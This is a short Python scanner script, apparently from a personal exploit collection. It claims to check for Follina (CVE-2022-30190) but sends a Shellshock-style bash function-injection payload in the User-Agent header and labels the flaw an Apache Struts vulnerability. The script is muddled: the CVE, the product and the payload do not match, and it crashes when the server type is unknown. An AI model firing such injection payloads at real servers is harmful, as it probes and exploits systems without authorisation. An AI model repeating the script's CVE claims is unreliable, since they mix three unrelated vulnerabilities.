# Check Follina CVE-2022-30190
# Author: cbk914
import argparse
import re
import requests

# Set up the command-line argument parser
parser = argparse.ArgumentParser(description="Exploit Apache Struts vulnerability (CVE-2022-30190)")
parser.add_argument("-t", "--target", required=True, help="Target URL")

# Parse the command-line arguments
args = parser.parse_args()

# Sanitize the input
url = re.search(r"^https?:\/\/[a-zA-Z0-9-.]+(:\d+)?", args.target)
if not url:
    parser.error("Invalid target format. Only URLs are allowed")
url = url.group()

# Identify the web server
try:
    response = requests.get(url)
    server = response.headers.get("Server")
    if server is None:
        raise ValueError("Cannot identify the server")
except (requests.exceptions.RequestException, ValueError) as e:
    print(f"Error identifying the server: {e}")
    exit(1)

# Determine if the target is running Apache or Nginx
if "Apache" in server:
    print("[*] Target is running Apache")
    payload = "() { :;}; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo 'Vulnerable!'"
elif "nginx" in server:
    print("[*] Target is running Nginx")
    payload = "() { test;};echo \"Vulnerable\""
else:
    print("Server type could not be determined.")

# Add the payload to the headers
headers = {"User-Agent": payload}

# Send a GET request to the target website with the modified headers
response = requests.get(args.target, headers=headers)

# Check the response for the payload
if "Vulnerable" in response.text:
    print("Target is vulnerable to CVE-2022-30190.")
else:
    print("Target is not vulnerable to CVE-2022-30190.")

